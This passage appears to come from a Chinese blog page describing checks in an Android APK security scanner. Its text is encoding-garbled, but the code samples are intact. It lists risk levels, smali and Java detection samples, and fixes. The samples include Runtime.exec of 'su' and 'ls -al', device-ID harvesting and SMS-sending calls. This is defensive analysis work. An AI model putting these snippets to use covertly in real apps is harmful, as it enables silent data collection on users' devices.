<p>æ£€æµ‹ä½¿ç”¨ä»¥ä¸‹åŠ å¯†ç®—æ³•çš„è·¯å¾„ï¼Œç›®å‰è¯¥æ£€æµ‹é¡¹åªæ£€æµ‹æ˜¯å¦åœ¨Javaå±‚æœ‰<strong>æ˜¾å¼åœ°</strong>ä¿å­˜å¯†é’¥ï¼Œè¿™åº”è¯¥æ˜¯æœ€æœ‰é£é™©çš„ä¸€ç§ä¿å­˜æ–¹å¼ã€‚</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">AES<span class="regexp">/CBC/</span>NoPadding</span><br><span class="line">AES<span class="regexp">/CBC/</span>PKCS7Padding</span><br><span class="line">AES<span class="regexp">/CTR/</span>NoPadding</span><br><span class="line">AES<span class="regexp">/ECB/</span>NoPadding</span><br><span class="line">AES<span class="regexp">/ECB/</span>PKCS7Padding</span><br><span class="line">AES<span class="regexp">/GCM/</span>NoPadding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>NoPadding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>PKCS1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">1</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">224</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">256</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">384</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">512</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPPadding</span><br></pre></td></tr></table></figure>
<h3 id="æ•°æ®æˆ–ç¨‹åºåŠ è½½æ£€æŸ¥">æ•°æ®æˆ–ç¨‹åºåŠ è½½æ£€æŸ¥</h3>
<p>**é£é™©ç­‰çº§ï¼š**æé†’</p>
<p>éœ€è¦è¿›è¡ŒåŠ¨æ€åˆ†æ</p>
<ul>
<li>æ˜¯å¦åŠ è½½å…¬å…±åŒºåŸŸç¨‹åºï¼Œå¦‚sdcardã€/data/local/tmp/ã€åº”ç”¨è‡ªåˆ›å»ºä½†å…¶ä»–åº”ç”¨æœ‰è¯»å†™æƒé™çš„ç›®å½•ä¸Š</li>
<li>æ˜¯å¦ä»ç½‘ç»œä¸‹è½½ï¼Œæ£€æµ‹æ–¹æ³•åŒ…æ‹¬ï¼šé˜…è¯»ä»£ç ã€ç›‘å¬ç½‘è·¯è¯·æ±‚ã€è§è¯†å­˜å‚¨åŒºåŸŸæ–‡ä»¶è¯»å†™ã€æŸ¥çœ‹å®‰è£…åŒ…</li>
<li>å‡çº§åŒ…æ˜¯å¦å­˜åœ¨å…¬å…±åŒºåŸŸå­˜å‚¨</li>
</ul>
<h3 id="BASE64å®‰å…¨æ£€æµ‹">BASE64å®‰å…¨æ£€æµ‹</h3>
<p>é£é™©ç­‰çº§ï¼š<code>æé†’</code></p>
<p>æ£€æµ‹å‡ºBASE64å­—ç¬¦ä¸²ï¼Œå¹¶è§£å¯†ã€‚</p>
<h3 id="æ–‡ä»¶å…¨å±€è¯»å†™æ¼æ´æ£€æµ‹">æ–‡ä»¶å…¨å±€è¯»å†™æ¼æ´æ£€æµ‹</h3>
<p>åœ¨ä½¿ç”¨getDirï¼ŒgetSharedPreferencesæˆ–openFileOutputæ—¶ï¼Œå¦‚æœè®¾ç½®äº†å…¨å±€çš„å¯è¯»æƒé™ï¼Œæ”»å‡»è€…æ¶æ„è¯»å–æ–‡ä»¶å†…å®¹ï¼Œè·å–æ•æ„Ÿä¿¡æ¯ã€‚åœ¨è®¾ç½®æ–‡ä»¶å±æ€§æ—¶å¦‚æœè®¾ç½®å…¨å±€å¯å†™ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šç¯¡æ”¹ã€ä¼ªé€ å†…å®¹ï¼Œå¯èƒ½ä¼šè¿›è¡Œè¯ˆéª—ç­‰è¡Œä¸ºï¼Œé€ æˆç”¨æˆ·è´¢äº§æŸå¤±ã€‚å…¶ä¸­getSharedPreferenceså¦‚æœè®¾ç½®å…¨å±€å†™æƒé™ï¼Œåˆ™å½“æ”»å‡»appè·Ÿè¢«æ”»å‡»appå…·æœ‰ç›¸åŒçš„<code>Android:sharedUserId</code>å±æ€§æ—¶å’Œç­¾åæ—¶ï¼Œæ”»å‡»appåˆ™å¯ä»¥è®¿é—®åˆ°å†…éƒ¨å­˜å‚¨æ–‡ä»¶è¿›è¡Œå†™å…¥æ“ä½œã€‚</p>
<p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>ä¸­å±</code></p>
<p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<p>æ£€æµ‹å‡ºä½¿ç”¨äº†getDirã€getSharedPreferenceså’ŒopenFileOutputå‡½æ•°çš„å‚æ•°å€¼æ˜¯å¦ä½¿ç”¨äº†<code>MODE_WORLD_READABLEå’ŒMODE_WORLD_WRITEABLE</code>ã€‚</p>
<p><strong>å»ºè®®</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨MODE_PRIVATEæ¨¡å¼åˆ›å»ºå†…éƒ¨å­˜å‚¨æ–‡ä»¶</li>
<li>åŠ å¯†å­˜å‚¨æ•æ„Ÿæ•°æ®</li>
<li>é¿å…åœ¨æ–‡ä»¶ä¸­å­˜å‚¨æ˜æ–‡æ•æ„Ÿä¿¡æ¯</li>
<li>é¿å…æ»¥ç”¨â€Android:sharedUserIdâ€å±æ€§</li>
</ul>
<p>å¦‚æœä¸¤ä¸ªapp<code>Android:sharedUserId</code>å±æ€§ç›¸åŒï¼Œåˆ‡ä½¿ç”¨çš„ç­¾åä¹Ÿç›¸åŒï¼Œåˆ™è¿™ä¸¤ä¸ªappå¯ä»¥äº’ç›¸è®¿é—®å†…éƒ¨å­˜å‚¨æ–‡ä»¶æ•°æ®ã€‚</p>
<h3 id="æ—¥å¿—æ³„éœ²é£é™©æ£€æµ‹">æ—¥å¿—æ³„éœ²é£é™©æ£€æµ‹</h3>
<p>åœ¨APPçš„å¼€å‘è¿‡ç¨‹ä¸­ï¼Œä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œé€šå¸¸ä¼šä½¿ç”¨logå‡½æ•°è¾“å‡ºä¸€äº›å…³é”®æµç¨‹çš„ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯ä¸­é€šå¸¸ä¼šåŒ…å«æ•æ„Ÿå†…å®¹ï¼Œå¦‚æ‰§è¡Œæµç¨‹ã€æ˜æ–‡çš„ç”¨æˆ·åå¯†ç ç­‰ï¼Œè¿™ä¼šè®©æ”»å‡»è€…æ›´åŠ å®¹æ˜“çš„äº†è§£APPå†…éƒ¨ç»“æ„æ–¹ä¾¿ç ´è§£å’Œæ”»å‡»ï¼Œç”šè‡³ç›´æ¥è·å–åˆ°æœ‰ä»·å€¼çš„æ•æ„Ÿä¿¡æ¯ã€‚</p>
<p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>æé†’</code></p>
<p><strong>é—®é¢˜ç¤ºä¾‹</strong>ï¼š</p>
<p>æ£€æµ‹æ˜¯å¦è°ƒç”¨äº†Log.vã€Log.dã€Log.eã€Log.iã€Log.wã€Log.fã€Log.så‡½æ•°</p>
<p><strong>å»ºè®®</strong>ï¼š</p>
<p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ç§»é™¤Logæ‰“å°ã€‚</p>
<h3 id="å¤–éƒ¨åŠ è½½dexæ£€æµ‹">å¤–éƒ¨åŠ è½½dexæ£€æµ‹</h3>
<p>åŠ¨æ€åŠ è½½çš„dexæ–‡ä»¶å­˜å‚¨åœ¨è¢«å…¶ä»–åº”ç”¨ä»»æ„è¯»å†™çš„ç›®å½•ä¸­(å¦‚sdcard)ï¼Œå¦‚æœæ²¡æœ‰å¯¹å¤–éƒ¨æ‰€åŠ è½½çš„dexæ–‡ä»¶åšå®Œæ•´æ€§æ£€éªŒï¼Œåº”ç”¨å°†ä¼šè¢«æ¶æ„ä»£ç æ³¨å…¥ï¼Œä»è€Œæ‰§è¡Œæ¶æ„ä»£ç </p>
<p>**é£é™©ç­‰çº§ï¼š**é«˜å±</p>
<p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<p>å…³é”®ï¼špublic DexClassLoader (String dexPath, String optimizedDirectory, String libraryPath, ClassLoader parent)</p>
<p>é¦–å…ˆè·å–æ‰€æœ‰è°ƒç”¨äº†DexClassLoaderå‡½æ•°çš„è·¯å¾„ï¼Œç„¶åå¯¹æ¯ä¸ªè·¯å¾„ä¸‹çš„ä»£ç ç‰‡æ®µè¿›è¡Œæ£€æŸ¥ï¼Œåˆ¤æ–­æœ‰æ²¡æœ‰è°ƒç”¨<code>Environment.getExternalStorageDirectory().toString()</code>è¯¥æ–¹æ³•ã€‚ä¸¤ä¸ªæ¡ä»¶åŒæ—¶æ»¡è¶³ï¼Œåˆ™åˆ¤å®šè¯¥è·¯å¾„ä¸‹çš„ä»£ç ç‰‡æ®µæœ‰é£é™©ã€‚</p>
<p><strong>å»ºè®®ï¼š</strong></p>
<ul>
<li>å°†æ‰€éœ€è¦åŠ¨æ€åŠ è½½çš„DEX/APKæ–‡ä»¶æ”¾ç½®åœ¨APKå†…éƒ¨æˆ–åº”ç”¨ç§æœ‰ç›®å½•ä¸­</li>
<li>ä½¿ç”¨åŠ å¯†ç½‘ç»œåè®®è¿›è¡Œä¸‹è½½åŠ è½½çš„DEX/APKæ–‡ä»¶å¹¶å°†å…¶æ”¾ç½®åœ¨åº”ç”¨ç§æœ‰ç›®å½•ä¸­</li>
<li>å¯¹ä¸å¯ä¿¡çš„åŠ è½½æ¥æºè¿›è¡Œå®Œæ•´æ€§æ ¡éªŒ</li>
</ul>
<h3 id="å¤–éƒ¨å­˜å‚¨è·¯å¾„æ£€æµ‹">å¤–éƒ¨å­˜å‚¨è·¯å¾„æ£€æµ‹</h3>
<p>æ–‡ä»¶å­˜æ”¾åœ¨external storageï¼Œä¾‹å¦‚sdå¡ï¼Œæ˜¯å…¨å±€å¯è¯»å¯å†™çš„ï¼Œç”±äºexternal storageå¯ä»¥è¢«ä»»æ„ç”¨æˆ·æ“ä½œï¼Œä¸”å¯ä»¥è¢«æ‰€æœ‰åº”ç”¨ä¿®æ”¹ä½¿ç”¨ï¼Œæ‰€æœ‰ï¼Œappçš„æ•æ„Ÿæ•°æ®å»ºè®®ä¸è¦å­˜æ”¾åœ¨external storage</p>
<p>**é£é™©ç­‰çº§ï¼š**ä½å±</p>
<p>åŠ¨æ€æ–¹æ³•ç›‘æµ‹<code>/data/data/&lt;packagename&gt;/</code>ç›®å½•ä¸‹æ‰€æœ‰ç”Ÿæˆçš„ç›®å½•æ˜¯å¦å¸¦æœ‰æ˜æ–‡ä¿¡æ¯æ³„éœ²</p>
<h3 id="æ˜æ–‡æ•°å­—è¯ä¹¦é£é™©">æ˜æ–‡æ•°å­—è¯ä¹¦é£é™©</h3>
<p>Apkä¸­ä½¿ç”¨çš„æ•°å­—è¯ä¹¦å¯è¢«ç”¨æ¥æ ¡éªŒæœåŠ¡å™¨çš„åˆæ³•èº«ä»½ï¼Œä»¥åŠåœ¨ä¸æœåŠ¡å™¨è¿›è¡Œé€šä¿¡çš„è¿‡ç¨‹ä¸­å¯¹ä¼ è¾“æ•°æ®è¿›è¡ŒåŠ å¯†ã€è§£å¯†è¿ç®—ï¼Œä¿è¯ä¼ è¾“æ•°æ®çš„ä¿å¯†æ€§ã€å®Œæ•´æ€§ã€‚æ˜æ–‡å­˜å‚¨çš„æ•°å­—è¯ä¹¦å¦‚æœè¢«ç¯¡æ”¹ï¼Œå®¢æˆ·ç«¯å¯èƒ½è¿æ¥åˆ°å‡å†’çš„æœåŠ¡ç«¯ä¸Šï¼Œå¯¼è‡´ç”¨æˆ·åã€å¯†ç ç­‰ä¿¡æ¯è¢«çªƒå–ï¼›å¦‚æœæ˜æ–‡è¯ä¹¦è¢«ç›—å–ï¼Œå¯èƒ½é€ æˆä¼ è¾“æ•°æ®è¢«æˆªè·è§£å¯†ï¼Œç”¨æˆ·ä¿¡æ¯æ³„éœ²ï¼Œæˆ–è€…ä¼ªé€ å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œç¯¡æ”¹æœåŠ¡å™¨ä¸­çš„ç”¨æˆ·æ•°æ®æˆ–é€ æˆæœåŠ¡å™¨å“åº”å¼‚å¸¸ã€‚</p>
<p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>ä¸­å±</code></p>
<p><strong>é—®é¢˜ç¤ºä¾‹</strong>ï¼š</p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    <span class="string">&quot;assets/location_public_key.der&quot;</span>,</span><br><span class="line">    <span class="string">&quot;assets/verisign.cer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;res/raw/servicecert.cer&quot;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="æ•æ„Ÿå‡½æ•°è°ƒç”¨æ£€æµ‹">æ•æ„Ÿå‡½æ•°è°ƒç”¨æ£€æµ‹</h2>
<h3 id="å®‰å…¨ç›¸å…³çš„å‡½æ•°æ£€æµ‹">å®‰å…¨ç›¸å…³çš„å‡½æ•°æ£€æµ‹</h3>
<p>ä¸€äº›å­˜æ”¾æ•æ„Ÿçš„å®‰å…¨é…ç½®ä¿¡æ¯çš„<strong>å‡½æ•°</strong>ï¼Œä¸€èˆ¬å‡½æ•°åéƒ½å¯èƒ½å¸¦æœ‰encryptã€decryptã€encodã€decodã€aesã€sha1ã€sha256ã€sha512ã€md5ã€decodeã€encodeç­‰å…³é”®å­—ã€‚</p>
<p>é€šè¿‡encryptã€decryptã€encodã€decodã€aesã€sha1ã€sha256ã€sha512ã€md5ã€decodeã€encodeç­‰å’Œå®‰å…¨ç›¸å…³çš„å…³é”®å­—è¿›è¡ŒåŒ¹é…æŸ¥æ‰¾ï¼Œç„¶åé€ä¸ªæ£€æµ‹ç±»çš„å®‰å…¨æ€§ã€‚</p>
<h3 id="å®‰å…¨ç›¸å…³çš„ç±»æ£€æµ‹">å®‰å…¨ç›¸å…³çš„ç±»æ£€æµ‹</h3>
<p>ä¸€äº›å­˜æ”¾æ•æ„Ÿçš„å®‰å…¨é…ç½®ä¿¡æ¯çš„<strong>æ–‡ä»¶</strong>ï¼Œä¸€èˆ¬æ–‡ä»¶éƒ½å¯èƒ½å¸¦æœ‰encryptã€decryptã€encodã€decodã€aesã€sha1ã€sha256ã€sha512ã€md5ã€decodeã€encodeç­‰å…³é”®å­—ã€‚</p>
<p>é€šè¿‡encryptã€decryptã€encodã€decodã€aesã€sha1ã€sha256ã€sha512ã€md5ã€decodeã€encodeç­‰å’Œå®‰å…¨ç›¸å…³çš„å…³é”®å­—è¿›è¡ŒåŒ¹é…æŸ¥æ‰¾ï¼Œç„¶åé€ä¸ªæ£€æµ‹ç±»çš„å®‰å…¨æ€§ã€‚</p>
<h3 id="è¿è¡Œå‘½ä»¤æ£€æµ‹">è¿è¡Œå‘½ä»¤æ£€æµ‹</h3>
<p>æ£€æµ‹ å‘½ä»¤æ‰§è¡Œç›¸å…³çš„ä»£ç </p>
<p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<p>Javaä»£ç </p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime rr <span class="operator">=</span> Runtime.getRuntime()<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">Process p <span class="operator">=</span> rr.exec(<span class="string">&quot;ls -al&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>Dalvik/ART</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const-string v2, <span class="string">&quot;ls -al&quot;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v1, v2&#125;, <span class="class">Ljava/lang/Runtime;</span>-&gt;exec(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/Process;</span></span><br></pre></td></tr></table></figure>
<h3 id="Native-LibraryåŠ è½½æ£€æµ‹">Native LibraryåŠ è½½æ£€æµ‹</h3>
<p>æ£€æµ‹åŠ è½½soæ–‡ä»¶çš„Nativeæ–¹æ³•ã€‚</p>
<p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>æç¤º</code></p>
<p>Javaä»£ç </p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.loadLibrary(<span class="string">&quot;libtest.so&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>Dalvik/ART</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ljava<span class="regexp">/lang/</span>System;-&gt;loadLibrary(Ljava<span class="regexp">/lang/</span>String;)V</span><br></pre></td></tr></table></figure>
<h3 id="å¤–éƒ¨åŠ¨æ€åŠ è½½dexæ£€æµ‹">å¤–éƒ¨åŠ¨æ€åŠ è½½dexæ£€æµ‹</h3>
<p>åœ¨Android4.1ä¹‹å‰çš„ç³»ç»Ÿç‰ˆæœ¬ï¼Œå…è®¸åº”ç”¨åœ¨å…¨å±€å¯è¯»å¯å†™çš„ä½ç½®åŠ¨æ€åŠ è½½dexæ–‡ä»¶ï¼Œæœ‰æ–‡ä»¶è¢«æ›¿æ¢çš„é£é™©</p>
<p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>æé†’</code></p>
<p><strong>é—®é¢˜ç¤ºä¾‹</strong>ï¼š</p>
<p>éœ€è¦æ£€æµ‹ä»£ç ä¸­çš„DexClassLoaderå’ŒAndroidç‰ˆæœ¬ï¼Œåªæœ‰Androidç‰ˆæœ¬ &lt; 4.1æ‰ä¼šå‡ºç°è¯¥æ¼æ´ã€‚</p>
<p>Javaä»£ç </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DexClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DexClassLoader</span>(</span><br><span class="line">    optimizedDexOutputPath.getAbsolutePath(),              <span class="comment">//å‚æ•°1</span></span><br><span class="line">    Environment.getExternalStorageDirectory().toString(),  <span class="comment">//å‚æ•°2</span></span><br><span class="line">    <span class="literal">null</span>,                                                  <span class="comment">//å‚æ•°3</span></span><br><span class="line">    getClassLoader());                                     <span class="comment">//å‚æ•°4</span></span><br></pre></td></tr></table></figure>
<p>Dalvik/ART</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">Ldalvik<span class="symbol">/system/DexClassLoader</span>;<span class="operator">-&gt;</span><span class="symbol">&lt;init&gt;</span>(Ljava<span class="symbol">/lang/String</span>;Ljava<span class="symbol">/lang/String</span>;</span><br><span class="line"></span><br><span class="line">Ljava<span class="symbol">/lang/String</span>;Ljava<span class="symbol">/lang/ClassLoader</span>;)V</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><strong>å»ºè®®</strong></p>
<ul>
<li>ç¦æ­¢å¤–éƒ¨ï¼ˆä¸å®‰å…¨çš„æºï¼‰åŠ è½½DEXï¼Œå°†æ‰€éœ€è¦åŠ¨æ€åŠ è½½çš„DEX/APKæ–‡ä»¶æ”¾ç½®åˆ°APKå†…éƒ¨æˆ–åº”ç”¨ç§æœ‰ç›®å½•ä¸­ã€‚</li>
<li>ä½¿ç”¨åŠ å¯†ç½‘ç»œåè®®è¿›è¡Œä¸‹è½½åŠ è½½çš„DEX/APKæ–‡ä»¶å¹¶å°†å…¶æ”¾ç½®åˆ°åº”ç”¨ç§æœ‰ç›®å½•ä¸­ã€‚</li>
<li>å¯¹ä¸å¯ä¿¡çš„åŠ è½½æ¥æºè¿›è¡Œå®Œæ•´æ€§æ ¡éªŒã€‚</li>
</ul>
<h3 id="rootä»£ç æ£€æµ‹">rootä»£ç æ£€æµ‹</h3>
<p>æ£€æŸ¥appæ˜¯å¦æœ‰æ‰§è¡Œæ£€æµ‹rootç¯å¢ƒçš„ä»£ç ã€‚</p>
<p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>æé†’</code></p>
<p><strong>é—®é¢˜ç¤ºä¾‹</strong>ï¼š</p>
<p>Javaä»£ç </p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime rr <span class="operator">=</span> Runtime.getRuntime()<span class="comment">;</span></span><br><span class="line">Process p <span class="operator">=</span> rr.exec(<span class="string">&quot;su&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>Dalvik/ART</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const-string v2, <span class="string">&quot;su&quot;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v1, v2&#125;, <span class="class">Ljava/lang/Runtime;</span>-&gt;exec(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/Process;</span></span><br></pre></td></tr></table></figure>
<h3 id="è·å–IMEI-å’ŒDevice-IDæ•æ„Ÿä¿¡æ¯ä»£ç æ£€æµ‹">è·å–IMEI å’ŒDevice IDæ•æ„Ÿä¿¡æ¯ä»£ç æ£€æµ‹</h3>
<p>æ£€æŸ¥appæ˜¯å¦æœ‰æ‰§è¡Œè·å–IMEIå’ŒDevice IDæ•æ„Ÿä¿¡æ¯çš„ä»£ç ã€‚</p>
<p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>æé†’</code></p>
<p><strong>é—®é¢˜ç¤ºä¾‹</strong>ï¼š</p>
<p>Javaä»£ç </p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TelephonyManager tm <span class="operator">=</span> (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">String DEVICE_ID <span class="operator">=</span> tm.getDeviceId()<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>Dalvik/ART</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.local</span> v1, <span class="string">&quot;tm&quot;</span>:<span class="class">Landroid/telephony/TelephonyManager;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v1&#125;, <span class="class">Landroid/telephony/TelephonyManager;</span>-&gt;getDeviceId()<span class="class">Ljava/lang/String;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">move-result-object </span>v0</span><br><span class="line"></span><br><span class="line"><span class="keyword">.local</span> v0, <span class="string">&quot;DEVICE_ID&quot;</span>:<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">return-void</span><br></pre></td></tr></table></figure>
<h3 id="è·å–Android-IDæ•æ„Ÿä¿¡æ¯ä»£ç æ£€æµ‹">è·å–Android IDæ•æ„Ÿä¿¡æ¯ä»£ç æ£€æµ‹</h3>
<p>æ£€æŸ¥appæ˜¯å¦æœ‰æ‰§è¡Œè·å–Android IDæ•æ„Ÿä¿¡æ¯çš„ä»£ç ã€‚</p>
<p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>æé†’</code></p>
<p><strong>é—®é¢˜ç¤ºä¾‹</strong>ï¼š</p>
<p>Javaä»£ç </p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> android.provider.Settings.Secure;</span><br><span class="line"><span class="type">String</span> androidId = Secure.<span class="built_in">getString</span>(<span class="built_in">getContentResolver</span>(), Secure.ANDROID_ID);</span><br></pre></td></tr></table></figure>
<p>Dalvik/ART</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class">Lcom/bug/sensitive/func/MainActivity;</span>-&gt;getContentResolver()<span class="class">Landroid/content/ContentResolver;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">move-result-object </span>v0</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">const-string </span>v1, <span class="string">&quot;android_id&quot;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-static </span>&#123;v0, v1&#125;, <span class="class">Landroid/provider/Settings$Secure;</span></span><br><span class="line">-&gt;getString(<span class="class">Landroid/content/ContentResolver;</span><span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/String;</span></span><br></pre></td></tr></table></figure>
<h3 id="å‘é€SMSæ•æ„Ÿä»£ç æ£€æµ‹">å‘é€SMSæ•æ„Ÿä»£ç æ£€æµ‹</h3>
<p>æ£€æŸ¥appæ˜¯å¦æœ‰è°ƒç”¨å‘é€SMSå‡½æ•°ã€‚</p>
<p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>æé†’</code></p>
<p><strong>é—®é¢˜ç¤ºä¾‹</strong>ï¼š</p>
<p>Javaä»£ç </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SmsManager</span> <span class="variable">smsm</span> <span class="operator">=</span> SmsManager.getDefault();</span><br><span class="line">smsm.sendTextMessage(<span class="string">&quot;123123&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;hello&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">smsm.sendDataMessage(<span class="string">&quot;13123&quot;</span>, <span class="string">&quot;123&quot;</span>, (<span class="type">short</span>) <span class="number">90</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">smsm.sendMultimediaMessage(<span class="built_in">this</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
<h3 id="æ–‡ä»¶åˆ é™¤ä»£ç æ£€æµ‹">æ–‡ä»¶åˆ é™¤ä»£ç æ£€æµ‹</h3>
<p>æ£€æµ‹appæ˜¯å¦æœ‰è°ƒç”¨åˆ é™¤æ–‡ä»¶çš„ä»£ç </p>
<p>**é£é™©ç­‰çº§ï¼š**æé†’</p>
<p><strong>é—®é¢˜ç¤ºä¾‹</strong></p>
<p>Javaä»£ç </p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">File</span> <span class="keyword">file</span> = <span class="keyword">new</span> <span class="keyword">File</span>(<span class="string">&quot;tmp.doc&quot;</span>);</span><br><span class="line"><span class="keyword">boolean</span> deleted = <span class="keyword">file</span>.<span class="keyword">delete</span>();</span><br></pre></td></tr></table></figure>
<p>ä¸Šè¿°ä»£ç åç¼–è¯‘åçš„Dalvik/ARTä»£ç ä¸º</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">new-instance v1, <span class="class">Ljava/io/File;</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">const-string </span>v2, <span class="string">&quot;tmp.doc&quot;</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-direct </span>&#123;v1, v2&#125;, <span class="class">Ljava/io/File;</span>-&gt;&lt;init&gt;(<span class="class">Ljava/lang/String;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">.line</span> 55</span><br><span class="line"><span class="keyword">.local</span> v1, <span class="string">&quot;file&quot;</span>:<span class="class">Ljava/io/File;</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v1&#125;, <span class="class">Ljava/io/File;</span>-&gt;delete()Z</span><br></pre></td></tr></table></figure>
